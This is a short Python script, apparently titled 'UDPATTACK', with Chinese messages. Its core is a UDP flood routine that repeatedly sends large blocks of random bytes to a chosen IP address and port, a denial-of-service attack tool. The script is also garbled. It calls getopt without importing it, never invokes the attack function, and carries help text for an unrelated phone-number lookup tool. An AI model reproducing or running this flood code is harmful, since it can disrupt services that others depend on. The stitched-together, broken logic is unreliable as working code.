#!/bin/python3
import threading
import socket
import time
import random
import sys
def logo ():
    print (" _   _ ____  ____   _  _____ _____  _    ____ _  __")
    print ("| | | |  _ \|  _ \ / \|_   _|_   _|/ \  / ___| |/ /")
    print ("| | | | | | | |_) / _ \ | |   | | / _ \| |   | ' /")
    print ("| |_| | |_| |  __/ ___ \| |   | |/ ___ \ |___| . \ ")
    print (" \___/|____/|_| /_/   \_\_|   |_/_/   \_\____|_|\_\ ")
    print ("\n [-]请填写足够运行的参数: python3",sys.argv[0]," [ip] [port] [len] [max]\n\n----作者:ms9944")
class udpattack():
    def start(ip,port,len,max):
        try:
            attack = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            address = (str(ip), port)
            ipaddr = (ip, port)
            l = 1
            while l <= len:
                attack.sendto(random._urandom(1024 * max), ipaddr)
                print(" Attack!==>ip:", ip,"==>port:", str(port)," ==>", str(len), "s==>max" , str(max))
                l = l + 1
        except KeyboardInterrupt:
            print ("攻击停止......")
if __name__ == "__main__":
    argx,opt = getopt.getopt(sys.argv[1:],"-i:-p:-l:-m:",['ip','port','len','max'])
    for de, sa in argx:
        if de in ('-i','--ip'):
            print ("[+]debug模式启动!")
            global debug
            debug = "true"
        if de in  ('-h','--help'):
            print ('QQ号反查绑订手机号:\n[options]:\n  -d  --debug 启动DEBUG调试模式\n  -h  --help  查看帮助\n  -v --version  查看工具版本\n  --by:ms9944\n')
            exit(1)
        if de in ('-v','--version'):
            print ('Script version is V0.2\n')
            exit(1)
